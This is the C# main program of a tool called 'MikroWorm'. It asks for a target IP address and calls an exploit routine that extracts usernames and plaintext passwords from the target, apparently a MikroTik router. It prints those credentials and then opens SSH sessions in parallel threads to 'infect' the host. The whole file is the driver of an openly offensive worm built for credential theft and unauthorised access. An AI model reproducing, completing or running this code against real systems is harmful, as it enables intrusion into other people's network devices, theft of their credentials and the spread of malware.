using System.Collections;
using System.Net;
using System.Net.Sockets;
using System.Security.Cryptography;
using System.Text;

namespace MikroWorm
{
    public class Program
    {


        static void Main(string[] args)
        {
            Console.Title = "MikroWorm - @Zebratic"; 

            while (true)
            {
                BetterConsole.WriteSelection("Target IP: ");
                string? ip = Console.ReadLine();
                BetterConsole.WriteLine("#############################");

                try
                {
                    List<User> users = Exploit.GetUsers(ip);
                    if (users != null)
                    {
                        List<Thread> sshThreads = new List<Thread>();
                        foreach (User user in users)
                        {
                            BetterConsole.WriteLine($"Username: {user.Username}".PadRight(32) + $"Password: {user.Password}'");
                            sshThreads.Add(new Thread(() => Exploit.TryInfect(ip, user)));
                        }

                        foreach (User user in users)
                            BetterConsole.WriteWarning($"Attempting to SSH into '{user.Username}@{ip}' using password: {user.Password}");

                        Parallel.ForEach(sshThreads, thread =>
                        {
                            thread.Start();
                            thread.Join();
                        });

                        BetterConsole.WriteLine("Done, press enter to continue...");
                        Console.ReadLine();
                    }
                    else { BetterConsole.WriteLine("Target might not be vulnerable!"); }
                }
                catch (Exception ex)
                {
                    BetterConsole.WriteMinus(ex.ToString());
                    Console.ReadLine();
                }
            }
        }
    }
}